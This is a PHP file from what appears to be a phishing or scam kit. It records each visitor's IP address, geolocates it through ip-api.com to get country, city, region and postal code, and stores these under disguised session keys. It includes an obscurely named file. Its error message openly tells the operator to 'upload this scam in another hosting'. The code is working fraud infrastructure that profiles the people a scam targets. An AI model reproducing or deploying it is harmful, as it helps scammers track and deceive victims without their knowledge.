<?php
	session_start();
	error_reporting(E_ERROR | E_PARSE);
	date_default_timezone_set('GMT');
	include('xanbbx.php');

	//DATE
	$DATE = date("Y-m-d h:i:s");

	// INFO IP
	if(!empty($_SERVER["HTTP_CLIENT_IP"]))
	{
		//check for ip from share internet
		$ipaddress = $_SERVER["HTTP_CLIENT_IP"];
		$_SESSION['xipx'] = $ipaddress;
	}
	else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
	{
		// Check for the Proxy User
		$ipaddress = $_SERVER["HTTP_X_FORWARDED_FOR"];
		$_SESSION['xipx'] = $ipaddress;
	}
	else
	{
		$ipaddress = $_SERVER["REMOTE_ADDR"];
		$_SESSION['xipx'] = $ipaddress;
	}

	$jsonArray = @json_decode(file_get_contents("http://ip-api.com/json/" . urlencode($ipaddress)));
	$country 		= $jsonArray->country;
	$countryCode 	= $jsonArray->countryCode;
	$city    		= $jsonArray->city;
	$regionName 	= $jsonArray->regionName;
	$zip			= $jsonArray->zip;

	//SESSIONS
	$_SESSION['xcountryx']  	= $country;
	$_SESSION['xcountryCodex']  = $countryCode;
	$_SESSION['xcityx']     	= $city;
	$_SESSION['xregionNamex']   = $regionName;
	$_SESSION['xzipx']  		= $zip;

	if(count($jsonArray) <= 0){
		die("<h1>The HOST can't get the Array info from API, Please upload this scam in another hosting. <br>Thank you :)</h1>");
	}

	//header("../index.php");
?>